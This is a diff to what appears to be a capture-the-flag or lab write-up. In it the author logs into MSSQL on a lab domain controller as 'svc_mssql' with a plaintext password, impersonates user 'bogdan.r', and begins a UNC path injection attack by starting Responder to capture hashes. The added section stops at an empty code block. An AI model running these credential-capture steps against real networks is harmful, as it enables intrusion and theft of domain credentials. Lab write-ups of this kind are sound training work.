@@ -483,7 +483,7 @@ SMB         10.1.232.232    445    SG-DC01          [+] shadowgate.local\svc_mss
 
 Now this user is compromised!
 
-# Access over mssql as `svc_mssql` user
+# Compromising `bogdan.r` via UNC path injection on mssqlclient
 
 ```python
 impacket-mssqlclient shadowgate.local/svc_mssql:'Password123!'@sg-dc01.shadowgate.local -windows-auth
@@ -521,7 +521,16 @@ SQL (SHADOWGATE\bogdan.r  guest@master)>
 
 I am able to impersonate the `bogdan.r` user, but this has no more access than the last user.
 
-But i could try some
+But i could try some UNC path injection
 
+https://github.com/NetSPI/PowerUpSQL/wiki/SQL-Server---UNC-Path-Injection-Cheat-Sheet
 
+```python
+sudo responder -I tun0
+```
 
+First ill start responder
+
+```python
+
+```
